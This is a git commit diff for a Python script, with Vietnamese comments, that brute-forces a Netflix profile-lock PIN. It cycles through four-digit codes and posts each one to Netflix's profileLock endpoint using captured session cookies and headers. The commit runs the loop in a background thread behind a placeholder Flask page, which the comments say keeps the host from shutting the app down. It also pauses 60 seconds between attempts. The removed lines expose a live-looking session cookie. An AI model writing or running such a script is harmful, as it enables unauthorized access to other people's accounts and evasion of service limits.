0cf3519e41baef3927e9ede072134d3e869fc022
Thành Trần <153441968+thanhbtm1@users.noreply.github.com>
2026-03-12 19:01:43 +0700

    Integrate Flask server with background PIN checking script
    Added a Flask web server to run a background script for checking Netflix PINs.

--- test1.py
+++ test1.py
@@ -1,5 +1,9 @@
+from flask import Flask
 import requests
+import threading
 from time import sleep
+
+app = Flask(__name__)
 cookies = {
     'netflix-sans-normal-3-loaded': 'true',
     'netflix-sans-bold-3-loaded': 'true',
@@ -42,50 +46,58 @@ headers = {
     'x-netflix.request.client.user.guid': 'VKV2YMB5SVBJ7NGNQQNHGDPJIY',
     'x-netflix.request.id': '60eda919375e449496729869e01f4b25',
     'x-netflix.uiversion': 'v5f199d90',
-    # 'cookie': 'netflix-sans-normal-3-loaded=true; netflix-sans-bold-3-loaded=true; flwssn=47786a92-4240-4600-a183-139fb8b558fa; gsid=47da1cfc-57af-4240-9a1c-1e2adc7f861c; nfvdid=BQFmAAEBEHfbjC6SzMtpGDzNubnWfpVg8DvNzXOUFVKysiVJzTHWbY-YJxulbc3xObfNGDfUQlMrswI5rqyM6f8VdogProOYqTdG7TGHLjuSGWcKpByxIJi-FaVetA7G-D0Lx9GwKejWuvqOwNChqlI0_dgHEQ57; SecureNetflixId=v%3D3%26mac%3DAQEAEQABABQw_seE67QXB_oPSvHxHS87JkODbNvPLR0.%26dt%3D1773301124914; NetflixId=v%3D3%26ct%3DBgjHlOvcAxKJA8JafxTcUUXmabvHtDIHAdGXullPmY00BVtakY6qwlgmYpuIuPLNa2OcrEhZVlz4QeDuqckwisasdb2fci2uSdqyd5yJWyjubH_IeiZW9PP7ltv3xbAET_1L2huiLjo7y3RgmGs-oxr48ED8q0BCp3s8T8Jvi78NjDB0qG0s6HB7kBuqsSP3PHw82NQvOYBzE2M9R1eKGomLg1mFohEcRQNNX0ZcY7g1KOrhEy-vkj_b7wETjgL8E3KNSruN5PCFnA85VeD8SRIFzxfe7aWQVhsBcVY1DzS_Ppzl6bQSAjVbx66YLdqfnuNDb4nlwaNlhwFmkovfCD7J251g5c-cZ2iomlcz08zv5qLTnLit5SC9M08yjltv6ID-HIi4Y16ECfXIntmUErSmUmBLdEdHTQbiUwtrP179eabNHEMydR3FPA4skiPuh5bfAoAfRLqJbOCmwbUd_M4u16bMseiFL_X7gkxStcxNdW0pHvj6CbEJeA6onYakoBufgMEInkd36pHA5G3lHYWeLhgGIg4KDHicXlEiIx6p-CyoCg..%26pg%3DVKV2YMB5SVBJ7NGNQQNHGDPJIY%26ch%3DAQEAEAABABS6ZeySa0E9iJEaS-PYE10R8gFwF1jQS98.; OptanonConsent=isGpcEnabled=0&datestamp=Thu+Mar+12+2026+14%3A48%3A05+GMT%2B0700+(Indochina+Time)&version=202601.1.0&browserGpcFlag=0&isIABGlobal=false&hosts=&consentId=4f7b893b-f3ac-469f-ac80-f37adc9b9ed3&interactionCount=1&isAnonUser=1&landingPath=NotLandingPage&groups=C0001%3A1%2CC0002%3A1%2CC0003%3A1%2CC0004%3A1&AwaitingReconsent=false&crTime=1771849987714',
 }
-for i in range(4883, 10000):
-    s = str(i)
-    if(i < 10):
-        s = "000" + s;
-    elif i < 100:
-        s = "00" + s;
-    elif i < 1000:
-        s = "0" + s;
-    json_data = {
-        'action': "verify",
-        'authURL': "c1.1773301681443.AgiMlOvcAxIg179nvW4M9TVw+RDKe2olNhls3rvejufGkCiDbIpSZvsYAg==",
-        'guid': "VKV2YMB5SVBJ7NGNQQNHGDPJIY",
-        'pin': s
-    }
-    for i in range(0,11,1):
-        if i == 10:
-            print(f"Đang check mã pin : {s} (1.0)\r", end = "")
-        else :
-            print(f"Đang check mã pin : {s} (0.{i})\r", end = "")
-        sleep(0.1)
-    response = requests.post(
-        'https://www.netflix.com/nq/website/memberapi/release/profileLock',
-        cookies=cookies,
-        headers=headers,
-        json=json_data,
-    )
-    check = response.status_code
-    
-    print("                                \r", end = "")
-    if(check == 200):
-        print(f"\033[32mMã pin là : {i}\033[32m")
-        break;
-    else:
-        print(f"\033[31mPin {s} sai:))\033[0m")
+# --- PHẦN 1: CODE CHẠY NGẦM CỦA BỆ HẠ ---
+def script_chay_ngam():
+    for i in range(4292, 10000):
+        try:
+            s = str(i)
+            if(i < 10):
+                s = "000" + s;
+            elif i < 100:
+                s = "00" + s;
+            elif i < 1000:
+                s = "0" + s;
+            json_data = {
+                'action': "verify",
+                'authURL': "c1.1773301681443.AgiMlOvcAxIg179nvW4M9TVw+RDKe2olNhls3rvejufGkCiDbIpSZvsYAg==",
+                'guid': "VKV2YMB5SVBJ7NGNQQNHGDPJIY",
+                'pin': s
+            }
+            for i in range(0,11,1):
+                if i == 10:
+                    print(f"Đang check mã pin : {s} (1.0)\r", end = "")
+                else :
+                    print(f"Đang check mã pin : {s} (0.{i})\r", end = "")
+                sleep(0.1)
+            response = requests.post(
+                'https://www.netflix.com/nq/website/memberapi/release/profileLock',
+                cookies=cookies,
+                headers=headers,
+                json=json_data,
+            )
+            check = response.status_code
+            
+            print("                                \r", end = "")
+            if(check == 200):
+                print(f"\033[32mMã pin là : {i}\033[32m")
+                break;
+            else:
+                print(f"\033[31mPin {s} sai:))\033[0m")
+                
+        except Exception as e:
+            print(f"Lỗi rồi bệ hạ: {e}")
+            
+        sleep(60)  # Nghỉ 60 giây rồi chạy tiếp
 
-# Note: json_data will not be serialized by requests
-# exactly as it was in the original request.
+# Chạy cái script này ở một luồng riêng để không làm đứng Web
+threading.Thread(target=script_chay_ngam, daemon=True).start()
 
-#response = requests.post(
-#    'https://www.netflix.com/nq/website/memberapi/release/profileLock',
-#    cookies=cookies,
-#    headers=headers,
-#    data=data,
 
-#)
+# --- PHẦN 2: CÁI VỎ FLASK ĐỂ RENDER KHÔNG ĐUỔI ---
+@app.route('/')
+def home():
+    return "Web đang chạy ngầm cho bệ hạ đây, yên tâm nhé!"
+
+if __name__ == "__main__":
+    app.run(host='0.0.0.0', port=10000)
